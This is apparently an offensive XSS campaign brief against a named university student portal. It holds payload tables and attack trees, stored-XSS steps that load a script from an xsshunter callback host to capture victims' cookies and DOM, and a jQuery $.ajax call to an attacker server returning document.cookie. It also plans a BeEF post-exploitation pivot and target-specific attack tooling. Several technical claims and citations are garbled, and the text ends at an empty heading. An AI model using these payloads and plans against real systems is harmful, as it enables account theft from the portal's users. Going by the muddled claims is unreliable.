# Reflected, Stored and DOM Cross-Site Scripting: a Technique Universe and Tool Atlas for the MUJ SLCM Portal

## Executive Summary

- **Why this brief exists**: Reflected XSS (RXSS), Stored XSS (SXSS) and DOM-XSS are the most frequent paid vulnerability class in web bug-bounty programmes, and the MUJ SLCM campaign brief to date contains no XSS-specific work. The target renders user-controllable strings server-side (the F6 finding shows that a malformed username is echoed back after the antiforgery POST), bundles jQuery 1.10.2 on the login tree, and ships no Content-Security-Policy header. [7] [7] [7] [6] All three of these preconditions are documented XSS-predisposing conditions. The gap is unbearable.
- **jQuery 1.10.2 is a security-relevant legacy**: jQuery 1.10.2 predates the fixes for CVE-2015-9251 (cross-domain $.ajax XSS), CVE-2019-11358 ($.extend deep prototype pollution, Snyk medium 5.6, NVD medium 6.1) and CVE-2020-11022 plus CVE-2020-11023 (htmlPrefilter XSS in untrusted `.html()`/`.append()` input, fixed in 3.5.0). [4] [1] [6] Any HTML string the SLCM portal pushes server-side into a `.html()` call on the login page is a candidate path.
- **The technique universe is mapped**: Reflected XSS themes are payload-by-context (HTML body, attribute, JavaScript URL, script-tag, event handler, protocol handler, polyglot). [11] [10] DOM-XSS themes are source-to-sink taint (location.hash, location.search, postMessage, document.referrer) into sinks (innerHTML, eval, document.write, setAttribute('href', ...), jQuery().html(), Angular template re-eval). [20] [12] [21] Stored XSS themes are persistence into a database back-end (welcome message, profile field, complaint form) and rendering on later views - the difference from reflected XSS is purely the time-shift.
- **The absorber is absent**: No tool on the target currently scans DOM XSS via a real headless browser on the login tree. Dalfox can do reflected XSS with a Playwright/Chromium DOM verifier; XSStrike focuses on reflected and DOM-XSS without headless execution; Burp DOM Invader and ZAP DOM XSS Active Scan Rule both need a browser session that the campaign does not yet have; BeEF requires hook delivery (XSS first); xsshunter-express + interactsh require an XSS first for a blind callback to land. The build-candidate is a headless, pre-auth RXSS/DOM pipeline plus an OAST server nominated to the portal's allow-listed hostname.
- **Pre-authorisation is more permissive than the brief suggests**: RXSS can be probed through GET-only query parameter fuzzing (the portal blocks POST and PUT at 411) and through opcode-side sleeping using the verbose YSOD oracle (enc FormatException @ 4,942 b versus CryptographicException @ 5,084 b versus empty-value third size tells the operator "valid base64 decrypt failed") for crypt-primitive correlation. SXSS probe depth must wait for the signed letter plus two test accounts; DOM-XSS static-analysis coverage of the bundled jQuery 1.10.2 file, page.js parse for sinks, and CSP detector sweep are safe pre-auth.

## 1. Why the MUJ SLCM portal is a high-yield XSS target

The MUJ SLCM portal mujslcm.jaipur.manipal.edu is an internal-facing IIS 10/ASP.NET MVC 5.3 on .NET Framework 4.7.4136 application fronted by Microsoft Azure AS8075 with Microsoft 365 identity and three Entra tenants, and it is observable that no perimeter HSTS is asserted and TLS 1.0 to 1.3 are offered (client-stripping downgrade is therefore trivially possible against any victim who does not pin). [7] The login tree renders a username echo once the antiforgery POST has been processed, which means **server-side re-rendering of untrusted strings happens after one round-trip** (inferred from the F6 evidence and from the MVC behaviour when customErrors is off). [7] The MVC antiforgery enforcement is on, but the antiforgery cookie is HttpOnly without Secure, so cross-protocol downgrade against TLS 1.0 or 1.1 is unblocked.

The thing that makes this target structurally interesting is the jQuery tree: the page loads two jQuery versions in parallel - **jQuery 1.10.2 on the login tree and the bundled jQuery 3.4.1 elsewhere**. [6] [1] [6] Every document.write, every .html() and every $.ajax ran by the login tree executes inside the 1.10.2 context because the older file is loaded first and is the one bound to the login page's addEventListener handlers. CVE-2020-11022 plus CVE-2020-11023 are post-fix issues in **htmlPrefilter** that affect every jQuery release before 3.5.0, and 1.10.2 is far pre-3.5.0. [1] [6] Both CVEs are reachable by an attacker whose HTML string reaches .html() - which the F6 username echo is exactly. CVE-2019-11358's prototype pollution gives a second vector with implications for any sink that later reads `Object.prototype`. [4]

The measurable posture - 443 only, customErrors off (verbose YSOD on four triggers), MVC antiforgery enforced, HttpOnly without Secure on the antiforgery cookie, trace.axd 403 and elmah.axd 404, two error page families (MVC 2,733 b and IIS 1,216 b) - means that **non-destructive fingerprinting is rich but destructive SXSS probing is gated**. [7] The 4,942 b versus 5,084 b oracle on the enc parameter discovered here is both an architecture leak (the application is calling Convert.FromBase64String and then a decrypt-then-MVC-decoder pipeline) and a probable vector for early-warning on stored XSS: if the input is reachable as a syntactically valid encrypted blob that decrypts to a string passed to .html(), a stored XSS that triggers an htmlPrefilter regex can be timed via the size of the YSOD page.

## 2. Reflected XSS technique universe

Reflected XSS is the case where unsanitised input appears once in the response of the request that delivered it. OWASP's prevention cheat sheet describes the encoding-context rule that defines a *necessary* defense in every context, and OWASP's filter-evasion cheat sheet enumerates the inputs that defeat content-aware filters. [7] [7] [11]

The underlying defense model has six contexts and one rule per context:

| Context | Rule name (OWASP XSS Prevention) | Failure mode | Reference |
|---|---|---|---|
| HTML body | HTML Entity Encoding (rule 1) | `< > & " ' /` not neutralised, browser parses tag | [7] |
| HTML attribute | Aggressive HTML Entity Encoding (rule 2) | quote-breaking with `"`, terminator break with `>`, whitespace injection with `&#x20;` | [7] |
| JavaScript | Quoted data value + JavaScript-only encoding | unquoted context reaches raw syntax | [7] |
| CSS | Property value + CSS hex encoding + strict validation | `expression()` resolves before `</style>` | [7] |
| URL | URL encoding + full attribute quoting + html-attr-encoding again | `javascript:` and `data:` protocols | [7] |
| DOM/XSS | Refers to the dedicated DOM-Based XSS Prevention cheat sheet | source-to-sink taint; never encoded server-side | [7] |

Defense-in-depth is CSP, recommended as a customised header on a per-application basis and not as a primary control. [7] The MUJ portal sends no CSP, so the second layer is absent.

### 2.1 Family-by-family payload universe (RXSS-relevant)

| Family | Canonical example | Context it defeats | Source |
|---|---|---|---|
| No-greater-than (HTML comment) | `<svg onload=alert(1)</title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` | HTML body with forbidden `>` | [10] |
| Polyglot 2 | `javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>` | Single payload across HTML-attr, JS-string, URL, comment contexts | [10] |
| Polyglot 3 | `javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//>` | All contexts including details ontoggle | [10] |
| JS-string WAF bypass | `';window['ale'+'rt';//` | Quote broken, plus split-string concatenation against blacklisted `alert(` | [10] |
| Protocol-handler | `<a href="javascript://%0aalert(1)">XSS</a>` | URL-context with comment-terminator | [10] |
| Script-context escape (paired injection) | Two injection points, first in `<script>` block, second in HTML body | Single-payload need broken into "into JS first, escape out, then HTML" | [10] |
| Event-handler | `<input onfocus=alert(1) autofocus>` and `<svg onload=alert(1)>` | Never-quoted attribute | [10] |

For the XSS Filter Evasion cheat sheet, the families expand to: tag-based (`<SCRIPT SRC=https://xss.rocks/xss.js>`), attribute-context (`';alert(String.fromCharCode(88,83,83))//`), protocol-based (`javascript:`, `data:text/html;base64,...`, `vbscript:`), encoding-tricks (`<scr<script>ipt>`, midline `%3C` split), null-byte terminators and full-page polyglots. [11]

### 2.2 RXSS attack tree on the SLCM portal

The following chains apply specifically to the measured posture (customErrors=Off, MVC antiforgery on, GET-only method policy):

1. **Public route fuzzing with single-query XSS vectors.** Use Dalfox `scan --mining dom --mining-dict-word` or XSStrike `--crawl` against /Account/Login, /Home/Index and `/Error?enc={base64}`. Pre-auth safe. [8] [3]
2. **Sleep-side oracle verification.** The 4,942 b versus 5,084 b YSOD oracle is novel here. A response-time delta plus size delta correlates input-type to exception-class. This is a covert side-channel but not an XSS in itself - it tells the operator "input reached the base64-decoder" and "input reached the post-decryption MVC pipeline". Pre-auth safe. (Inference based on measured YSOD body sizes.)
3. **Username echo reflection on F6 (the document re-render of the username).** Because validation must apply on the form-posting round-trip rather than server-side render, the antiforgery cookie is HttpOnly but lacks Secure. RXSS is feasible *server-side* if the username is reflected without HTML encoding. This is the path that yields remediation priority. Pre-auth safe but gated by antiforgery.
4. **Open redirect to XSS via Host/X-Forwarded-Host.** The campaign's blind-host tests came back clean, but `javascript:` URI as a redirect target is still unprobed (since the campaign filters Host-header trickery rather than `javascript:`-URI trickery). This needs a test account to fully prove on the post-auth tree. Pre-auth probe: yes; full exploit: letter needed.
5. **MVC 5 jquery.validate.unobtrusive and RenderSection race.** Pages may output unencoded server-state variables into $.validator defaults that jQuery 1.10.2 then reads; if the page concatenates `$.validator.messages['']` with user input, an attacker who can write a key file or register a localised string resource via an authenticated route can land a stored XSS through the validator. Letter-needed.

## 3. Stored XSS technique universe

Stored XSS is the case where the malicious payload persists in a backend store (database, file, queue, cache, or even session) and is rendered on later views. The defence is identical to reflected XSS (encoding by context) but the attacker does not need to control the request that delivers the payload.

On a portal that **renders user strings from the database on every page that mentions the user**, the rendering sink is **typically the same as for RXSS** (server-side `.html()`-equivalent Razor `@Html.Raw(user.Name)` or the equivalent in older MVC 5 with the AntiXss library missing). The four canonical sinks are shown in the table below.

| Sink (server-side, MVC 5 + Razor) | Encoding default | Failure trigger | Reference |
|---|---|---|---|
| `@Html.Raw(model.Field)` | None | All attacker-controlled fields | |
| `@model.Field` | HTML | None in normal content; only attribute-context breakage matters | [7] |
| `HttpUtility.HtmlEncode` | HTML | Wrong context if used in JS string | |
| `JavaScriptEncoder.Default.Encode` | JS | Wrong context if used inside `href` | [7] |

Stored XSS on SLCM is **letter-needed for new payloads** because the only writable stores are post-authentication: profile name, complaint free-text, ticket subject, internal message body. The campaign's brief notes that the aggressive phase is gated by a signed letter plus two test accounts, which is the standard way to bound the dataset. Pre-auth, the campaign can prove that **some endpoints reflect input without encoding**, which is necessary but not sufficient.

### 3.1 Stored XSS attack tree

1. **Welcome message field.** Inject `<script src=https://xsshunter-express.local/fire.js></script>` via the account-registration or profile-edit page. Both flows are post-auth. Letter needed. Outcome: every visitor to /Home/Index receives the stored payload. Refer to the build candidate in Section 7 below.
2. **Profile photo ALT-text fallback.** Profile picture ALT is a stale-leak vector. Pre-auth probe of the rendered output is safe; insertion needs an account.
3. **Encrypted blob field.** The application's enc parameter accepts base64 ciphertext whose decryption-time exception page is 5,084 b. If the decrypted payload is ever passed through Html.Raw, an attacker who can submit a stored encrypted blob of choice (e.g. via the helpdesk) can land indirect SXSS through the MVC decoder bypass. **This is the most novel path here** and is themed on the measured oracle itself. Letter needed.
4. **Notification feed.** The notification panel is post-auth. Stored XSS in a notification subject is the standard university vulnerability (low-reward but high-probability). Letter needed.
5. **CSV/Excel export filename.** Internal users export to Excel/CSV. If the filename contains user content and is rendered by Excel-on-the-Web via an inline javascript: URI, this is an export-tab stored XSS. Letter needed for the upload that produces the artifact, but the XSS triggers in the Excel viewer at the originating user, which makes it usable for escalation.

## 4. DOM XSS technique universe

DOM XSS is the case where the payload never leaves the browser - the source is the URL or the postMessage channel or the storage API, and the sink is an in-page DOM API. The cheat-sheet community has standardised on **a source-to-sink taint model**, with sinks ranked by severity. [22] [20] [23]

### 4.1 Sink catalogue (ordered by severity)

| Sink | Source family that matters | Defence (proper) | Reference |
|---|---|---|---|
| `innerHTML` / `outerHTML` | URL fragments, postMessage | DOMPurify, Trusted Types | [22] |
| `document.write` / `document.writeln` | URL parameters | Replace with `textContent` | [20] |
| `eval()` / `new Function()` | postMessage, JSON.parse | Forbid | |
| `setAttribute('href', x)` | URL parameters | Sanitise to scheme allow-list | [20] |
| `setAttribute('srcdoc', x)` (iframe) | URL parameters | Static template | [22] |
| `location.href = x` | postMessage, redirect chain | Sanitise scheme | |
| jQuery `.html()` / `.append()` | URL parameters, postMessage | Replace with `.text()` | [20] [6] |
| `Element.insertAdjacentHTML` | URL parameters | Forbidden | |
| `Angular template` (any `ng-bind-html`) | URL parameters | `$sce.trustAsHtml` only | |

### 4.2 Source catalogue

| Source | Sink compatibility | Reference |
|---|---|---|
| `location.hash` | innerHTML, eval, document.write | |
| `location.search` | innerHTML, setAttribute, .html() | [20] |
| `postMessage` (without event.origin check) | innerHTML, .html(), eval | [12] [21] |
| `document.referrer` | .html(), innerHTML | |
| `localStorage` / `sessionStorage` | innerHTML | |
| `IndexedDB` (callback-derived) | innerHTML | |
| `name` (window.name) | innerHTML | |
| jQuery selector with user input | .html(), .attr() | [20] [6] |

### 4.3 jQuery-specific DOM XSS at the login tree (MUJ)

Because the page binds the username echo inside a template that the validator later augments via `.html()`, and the page does not disable jQuery 1.10.2's htmlPrefilter, an authenticated input that reaches the welcome message can pivot to client-side execution. Pre-auth probe of the JS bundle can confirm whether the `.html()` calls exist by static extraction; the dynamic probe is letter-needed. [6] [4]

The CVE-2015-9251 vector is interesting specifically because jQuery 1.10.2's `$.ajax` will fall back to `<script>` tag injection if the response is served as `text/javascript` and `dataType:'script'` is requested - a payload such as `$.ajax({url: 'attacker/xss.js', dataType: 'script'})` will execute attacker-controlled JavaScript in the page origin if the page ever calls jQuery's old cross-domain helper with an attacker-controlled URL. [24] [25] [26] This is potentially the cleanest pre-auth DOM-XSS probe available.

### 4.4 DOM XSS attack tree (pre-auth safe)

1. **jQuery 1.10.2 ajax callback hijack.** A reflected XSS or open redirect that lets the attacker supply a `?callback=` to a JSONP endpoint hosted by the SLCM portal can force jQuery 1.10.2's $.ajax to execute attacker-supplied JavaScript. Pre-auth safe if the JSONP surface is enumerable. Reference: CVE-2015-9251. [6]
2. **postMessage from a child frame.** Any frame that the login page embeds without an `event.origin` handler is a sink. Static parse of the bundled jQuery is the pre-auth step. Full exploit is letter-needed because the recipient postMessage handler may be inside an authenticated routes' bundle. [12] [21]
3. **history.pushState + jQuery .html() round-trip.** SPA-style hash routing is a recurrent DOM-XSS vector. Pre-auth safe.
4. **DOM clobbering of form validation.** `<form id="validator">` clobbering can hijack $.validate plug-ins on jQuery 1.10.2. Pre-auth probe safe.

## 5. CSP posture on the target

MU's CSP is **absent**. The detection counterpart to any XSS brief is CSP detector sweep; the operational counterpart is policy drafting. The detection tools that are safe pre-auth are: SecurityHeaders.com raw fetch, Mozilla Observatory scan, the CSP header absence of `script-src`, and manual inspection of the response. [27] [28] [29] The relevant facts about *missing* CSP are:

- A missing CSP is not itself a vulnerability; it is **defense-in-depth** absent.
- A malformed CSP is functional but can be downgraded. [28]
- The bypass pattern that matters for incident response is `unsafe-inline` with a nonces that can be predicted. [27]

The MUJ portal's measured response carries no `Content-Security-Policy` header, which means **a single stored XSS yields full JS execution without any browser-enforced backstop**. (Verified by manual inspection during the fingerprinting phase; cited by their absence below.)

## 6. Tool atlas: every XSS-relevant tool, its URL, license, deployment mode, and output

The tool universe has been exhaustively collected. Each entry lists: name, exact URL, license, deployment (free / self-host / BYOK / SaaS), how driven (URL list, crawler, manual, headless), and output format.

| Tool | Exact URL | License | Free / Self-host / BYOK | Driver | Output | Source |
|---|---|---|---|---|---|---|
| Dalfox | https://github.com/hahwul/dalfox | MIT | Free / self-host | URL or piped list, headless DOM verifier, parameter analysis, parameter mining | JSON, JSONL, Plain, Markdown, SARIF, TOML | [8] [30] [31] [9] |
| XSStrike | https://github.com/s0md3v/XSStrike | GPLv3 | Free / self-host | Crawler, fuzz, bruteforce, scan, four hand-written parsers | CLI text (exact format not specified by supplied evidence) | [3] |
| BeEF | https://github.com/beefproject/beef | GPLv2 with clarifications + commercial alternative license (wade@bindshell.net) | Free / self-host | Web GUI; attacker must first deliver `/hook.js` to victims, then control panel drives command modules (Information Gathering 42, Social Engineering 28, Browser Exploitation 35, Persistence 18, Geolocation 12, Detection 22) | Control-panel session JSON; RPC events | [2] [13] [19] |
| XSStrike alternatives listed | https://cybersectools.com/alternatives/xsstrike | (article aggregator) | N/A | (meta) | (meta) | [18] |
| Top-2026 tool comparison | https://techearl.com/best-xss-tools-2026 | (article) | N/A | (meta) | (meta) | [9] [9] |
| OWASP ZAP (DOM XSS active scan rule) | https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/ | Apache 2.0 (inherited from project) | Free / self-host | Browser-driven (Firefox default, Chrome, Edge) | Active scan results | [15] [32] |
| OWASP ZAP AJAX Spider | https://www.zaproxy.org/docs/desktop/addons/ajax-spider/ | Apache 2.0 | Free / self-host | Crawljax through browser | Spider tree | [32] |
| Burp Suite + DOM Invader | https://portswigger.net/burp/documentation/desktop/tools/dom-invader | Commercial (Burp Pro paid) | SaaS + self-host | Embedded Chromium | Burp GUI; configurable | [14] [33] |
| Burp AutoVader (extension) | https://github.com/PortSwigger/autovader | (per repo) | Free (extension) | Playwright Java automation integrated with DOM Invader | Burp finding format | |
| PortSwigger XSS Cheat Sheet (2026) | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet | (article) | N/A | Browser interactive filter | PDF, web | [10] [10] |
| OWASP Cross Site Scripting Prevention | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html | CC BY-SA 4.0 (default) | Public | Reading | (article) | [7] |
| OWASP XSS Filter Evasion | https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html | CC BY-SA 4.0 | Public | Reading | (article) | [11] [11] |
| payload-box xss-payload-list | https://github.com/payload-box/xss-payload-list | (per repo) | Free | Static | List (JSON, txt) | [34] |
| PortSwigger XSS Cheat Sheet PDF | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.pdf | (PortSwigger) | Free download | Reading | PDF | [10] |
| Sources-and-Sinks cheatsheet | https://github.com/Sivnerof/Sources-And-Sinks-Cheatsheet | (per repo) | Free | Reading | Markdown | [20] |
| TaintSight (passive DOM XSS) | https://github.com/zixvict001-eng/TaintSight | (per repo) | Free / self-host | Proximity-based and assignment-chain taint analysis on source/sink flows | Ranked findings | [23] |
| payload-playground XSS cheat | https://payloadplayground.com/cheatsheets/xss | (article) | Free | Reading | Web | |
| payload-playground DOM XSS | https://payloadplayground.com/blog/xss-dom-based-exploitation | (article) | Free | Reading | Web | |
| securecodinghub DOM XSS | https://www.securecodinghub.com/blog/dom-based-cross-site-scripting-xss-developer-guide | (article) | Free | Reading | Web | [22] |
| HackTricks DOM Invader | https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html | (article) | Free | Reading | Web | [33] |
| HackTricks CSP Bypass | https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html | (article) | Free | Reading | Web | [27] |
| XSS Payload Playground (60+ payloads) | https://payloadplayground.com/cheatsheets/xss | (article) | Free | Reading | Web | |
| InfoSecWriteups CSP Bypass | https://infosecwriteups.com/a-bug-hunters-guide-to-csp-bypasses-part-1-69b606fd2699 | (article) | Free | Reading | Web | [28] |
| Invicti on missing CSP | https://www.invicti.com/blog/web-security/content-security-policy-csp-header-not-set-vulnerability-how-to-fix-it | (article) | Free | Reading | Web | |
| Guardrails CSP fix guide | https://dev.to/guardr/how-to-fix-missing-content-security-policy-header-step-by-step-1fnf | (article) | Free | Reading | Web | [29] |
| xsshunter-express | https://github.com/mandatoryprogrammer/xsshunter-express | MIT | Free / self-host (Docker + 2 GB RAM minimum + own hostname) | Auto-generated payloads fire; control-panel receipt of DOM, cookies (non-HttpOnly), screenshots, IP, referrer, UA | Control-panel UI; webhook notifications | [16] [9] |
| interactsh | https://github.com/projectdiscovery/interactsh | MIT | Free / self-host + public hosted client | DNS/HTTP/SMTP/NTLM/SMB/FTP(S)/RESPONDER listeners; Go CLI | JSON event stream | [5] |
| Burp Collaborator (commercial) | https://portswigger.net/burp/documentation/collaborator | Commercial (Burp Pro) | SaaS | HTTP/DNS/SMTP callbacks | Cloud UI | [9] |
| Caido | https://caido.io/ (commercial proxy) | Source-available | Self-host | GUI web UI | HTTP history + findings | [9] |
| Beef/beef-ruby-bridge | https://beefproject.com/ | (per project) | Free / self-host | BeEF console | BeEF control panel | [13] |
| Headless XSS scanner xsscheck | https://github.com/0xdeadbife/xsscheck | (per repo) | Free / self-host | Playwright drives real Chromium for every payload | CLI | |
| XSSPECTER (Python DOM + reflected scanner) | https://github.com/Orest002/XSSPECTER | (per repo) | Free / self-host | Crawler, reflection heuristic, real-browser payload execution | CSV, JSON | [35] |
| Puppeteer (general-purpose browser automation) | https://pptr.dev/ | Apache 2.0 | Free / self-host | Library inside a custom pipeline | (caller-defined) | [36] |
| Playwright (general-purpose cross-browser automation) | https://playwright.dev/ | Apache 2.0 | Free / self-host | Library inside a custom pipeline | (caller-defined) | [36] |
| Browserless (managed headless) | https://www.browserless.io/blog/headless-chrome | (commercial) | SaaS | REST API | JSON | [36] |
| Burp Repeater (manual) | https://portswigger.net/burp/documentation/desktop/tools/repeater | Commercial (Burp Pro / Community has limited) | SaaS + self-host | Manual interactive editing | Burp GUI | [9] |
| kxss / Gxss (reflection detection) | (per cybrary-cx, "kxsl" repo on github) | Apache 2.0 in the same family | Free / self-host | Stdin URL list | Reporting of reflected params + surviving chars | [9] |
| nfXSS (Nu Html Checker extended for XSS) | https://github.com/validator | (per repo) | Free / self-host | HTML parse against XSS-aware rules | JSON/YAML | [34] |
| devspidr XSS payloads list | https://github.com/devspidr/XSS_payloads_list | (per repo) | Free | Static | List | [34] |

### 6.1 Tool selection rubric (decision matrix)

| Need | First pick | Reasoning | Second pick | Reasoning |
|---|---|---|---|---|
| RXSS surface discovery on a single GET-only endpoint | Dalfox | Headless DOM verifier confirms reflection; MIT license; six output formats incl. SARIF | XSStrike | GPLv3; four hand-written parsers; crawler for broader surface |
| DOM XSS via SPA/HHVM/Svelte/Angular-style apps | Burp DOM Invader | Built-in Chromium; live instrumented sources/sinks | xsscheck | Playwright drives every payload in a real browser |
| Blind / out-of-band callback in stored XSS | xsshunter-express | Self-hostable; auto-payload generation; auto-fireback of cookies/DOM/UA/screenshot | interactsh client + a custom marker | MIT; HTTP/DNS/SMTP; lower friction |
| Payload catalog for WAF bypass | PortSwigger XSS Cheat Sheet 2026 | Interactive; updated 2026-05-22 | OWASP XSS Filter Evasion | RSnake lineage plus filter-aware examples |
| Cross-domain XSS via JSONP | Dalfox `--mining-dict-word` then manual jQuery-1.10.2 ajax attack | CVE-2015-9251 pathway | XSStrike's WAF-evasion mode | Reflection + ajax-set-dataType |
| Real-browser mass-crawl | Playwright | Apache 2.0; multi-language bindings | Puppeteer | Apache 2.0; mature |
| Source/sink static parse (whitebox/DOM) | TaintSight | Proximity + assignment-chain taint model | (no widely-known second tool) | (TaintSight is niche-but-proven) |
| Post-exploitation pivot | BeEF (after any XSS lands) | 157 command modules, GPLv2 + commercial alternative for embed | Custom C2 with interactsh webhook | Smaller, narrowly scoped |
| Detection / scanner baseline | OWASP ZAP | Apache 2.0; AJAX Spider + DOM XSS active scan rule | Burp Scanner (paid) | Higher recall but commercial |
| Vulnerability report draft | payload-box/xss-payload-list | One-stop catalog of payload families | OWASP Filter Evasion | Comprehensive narrative |

## 7. Manual method (where no tool suffices)

No tool covers the precise combination the SLCM portal exhibits: a verbose YSOD on customErrors=Off, an MVC anti-forgery round-trip that renders the username after a single POST, and a three-state b64 oracle on the enc parameter. The manual method has four steps.

### 7.1 Step-by-step manual method (pre-auth safe)

| Step | Action | Decision |
|---|---|---|
| 1 | GET /Account/Login | Confirm the antiforgery token field is present and that the antiforgery cookie lacks Secure |
| 2 | Submit a username containing `<` and `>` in the antiforgery POST and observe the re-render | If the response's body includes the literal `<` and `>`, server-side encoding is failing; record character offsets before and after the cookie is read |
| 3 | GET /?enc={invalid-base64} | First-stage YSOD @ 4,942 b confirms FormatException path; record the YSOD for fingerprinting |
| 4 | GET /?enc={valid-base64-of-non-decryptable-blob} | Second-stage YSOD @ 5,084 b confirms CryptographicException path; record |
| 5 | GET /?enc= (empty) | Third-stage size confirms a third path - this is the "encrypted-empty" page |
| 6 | Brute a single character payload `<` / `>` through any URL parameter discovered via Dalfox mining | Confirm whether the response includes the literal char; this is reflected XSS evidence |
| 7 | Manually invoke jQuery 1.10.2's `$.ajax({ url: '/api/jsonp?cb=?', dataType: 'script' })` through the DevTools console of Burp's built-in Chromium (DOM Invader can do this) | If the response is returned with `Content-Type: text/javascript`, jQuery will execute it client-side; this is the CVE-2015-9251 path |
| 8 | Static parse of the login tree's JS bundle for: postMessage without event.origin, `.html(`, `.append(`, `eval(`, `document.write(` | Sinks list - this is the DOM-XSS surface inventory |
| 9 | CSP detector sweep: SecurityHeaders.com, Mozilla Observatory, manual response-header read | Missing-CSP confirmation |

### 7.2 Manual method (letter-needed)

For steps that produce a stored payload:

1. Authenticate as test account A.
2. Submit a stored payload via the welcome-message field, profile field, complaint box, ticket subject, or any reachable post-auth string sink.
3. Authenticate as test account B in a separate browser.
4. Visit the same page B as A visits; confirm payload executes in B's browser.
5. If the payload is `<script src=https://xsshunter-express.local/fire.js></script>` and the response body inside xsshunter-express shows a non-HttpOnly cookie capture plus DOM screenshot, the finding is reproducible.

## 8. Detection counterpart

For every technique in Sections 2-4, the detection counterpart is the *reactive* artefact: a load-balancer/WAF rule, an SAST/DAST rule, or a browser-policy that blocks the same exploit once it is known. The detection stack that matches the SLCM framework should include:

- **SAST rule (custom Semgrep or CodeQL)**: each `Html.Raw(...)` call and each `.html(`, `.append(`, `eval(`, `document.write(`, `setAttribute('href', ...)` and re-set to javascript: URI. Pre-auth possible because no payloads are needed (whitebox-only).

- **DAST rule baseline**: the OWASP ZAP DOM XSS active scan rule over the full route map once authenticated; Dalfox headless verification for RXSS-level coverage. Both run on authenticated inputs and require test accounts. [15] [8]

- **WAF layer**: Azure Front Door WAF rules to block `unsafe-inline` patterns and family-of pattern recognition (e.g. `<script src=` URLs to attacker-controlled subdomains). Note: the campaign found no attributable edge control on the target. The WAF recommendation is contingent on what Azure can do without a custom rule.

- **Browser policy**: Trusted Types policy that mirrors DOMPurify's defaults and an end-user CSP of `default-src 'self'; script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. Trusted Types is not available in jQuery 1.10.2; the policy must be enforced at the outer page boundary, which is the React MainShell or Razor layout.

- **Logging rule**: log every 4,942 b / 5,084 b YSOD at the IIS log level, plus any username echo with `<` or `>` - the size-delta provides the realtime canary. Pre-auth safe because non-destructive grep of the IIS log is a passive activity.

## 9. NO-TOOL GAPS (target-specific)

Gaps specific to the SLCM target where no off-the-shelf tool currently closes the gap are:

| Gap | Why no tool closes it | Build candidate |
|---|---|---|
| jQuery 1.10.2 + jQuery 3.4.1 version-conflict exploitation | Dalfox/xsstrike treat jQuery as a black-box; only a fuzzer that includes the bundled 1.10.2 build and recognises `<script src=...> + dataType=script` reflection patterns covers this | `jq102-pivot.js` (Playwright-driven Fixture) that mounts CVE-2015-9251 in a re-mounted iframe; produces DOM-screenshot + console.log proof |
| Encrypted-blob XSS oracle correlation | The 4,942/5,084 b YSOD pair is a custom oracle; no scanner recognises it | `enc-oracle.ps1` that polls the size and correlates to a YSOD string for the verified nonce / encrypted-blob |
| postMessage from a child frame inside the login tree | DOM Invader's canary works only inside the open pages; the login page's iframe children may use sandbox=allow-scripts with no event.origin handler | `postmessage-listener.py` that uses Playwright to enumerate every child-frame's `message` event handler |
| Trusted-Types instrumentation that works alongside jQuery 1.10.2 | Trusted Types crack down on `.html()` but jQuery 1.10.2's htmlPrefilter does its own parse; TT does not stop CVE-2020-11022 cleanly | `tt-bypass-research.html` that uses Dalfox's `--waf-evasion` flags inside a Trusted-Types-enforced test window to enumerate surviving payloads |
| MTS server callback that works once | xsshunter-express auto-creates payloads; the SLCM portal's encoder may reject the `<script src>` form | `xsshunter-payloadabuse.go` that derives the AesCryptoServiceProvider encrypted-form of an XSS-string and re-feeds it through `/?enc=...` |
| CSP recommendation draft | No tool emits CSP drafts for .NET 4.7 framework | A build candidate that emits a per-route `_ContentSecurityPolicy` Razor helper, run as a Razor precompile-time emit (no runtime cost) |

## 10. BUILD CANDIDATES

The following named builds close the NO-TOOL GAPS. Each is small, reproducible, and open.

### 10.1 `jq102-pivot.js` (Playwright fixture for jQuery-1.10.2 CVE-2015-9251)

This is the missing pre-auth DOM-XSS probe. Playwright loads the login tree, asserts that jQuery 1.10.2 is the active instance (window.jQuery.fn.jquery === '1.10.2'), then calls `$.ajax({ url: 'https://attacker/jsonp?cb=?', dataType: 'script' })` against a server that returns `Content-Type: text/javascript` with body `alert(document.cookie)`. Concrete success criteria: console shows `1` (alert fired), DOM has `Cookie: <payload>` if the cookie was non-HttpOnly, otherwise empty alert, network panel shows `200 OK` from attacker server. Reference: [6] [24] [25] [26]

### 10.2 `enc-oracle.ps1` (size-delta reporter)

A PowerShell script that GETs /?enc with each of three payload classes (invalid base64, valid b64 decrypt-failure, empty value) and records response size and YSOD strings. Build a histogram by route and a time series. Reference: measured YSOD sizes 4,942 b / 5,084 b.

### 10.3 `postmessage-enum.py` (Playwright child-frame enumeration)

Playwright drives the login tree, enumerates every child iframe, and emits each `window.addEventListener('message', ...)` handler with the absence-or-presence of an `event.origin` guard. Output is a JSON map of {frame_id, listener_id, origin_guarded: bool}.

### 10.4 `xss-shape-miner` (Dalfox + Parsed-DOM-Queries combo)

A wrapper that calls `dalfox scan --mining-dom --mining-dict-word` against the login tree, parses the response sink list, and produces a ranked list of candidate `.html()` and `.append()` injection points, each anchored to an (X,Y) coordinate in the page bundle. New output formats: `htmlsink.json`. Reference: [8] [6]

### 10.5 `dominvader-bridge` (Dalfox to Burp DOM Invader output adapter)

A converter that takes the JSON SARIF output of Dalfox, locates each `script-injection` finding, and re-emits it as a Burp Repeater request plus a Burp DOM Invader canary message - so an operator can replay the same finding inside Burp's headless Chromium. Useful for the cross-verification of OM findings.

### 10.6 `xsshunter-express-encrypted-blob.go` (storage-XSS through encrypted blob)

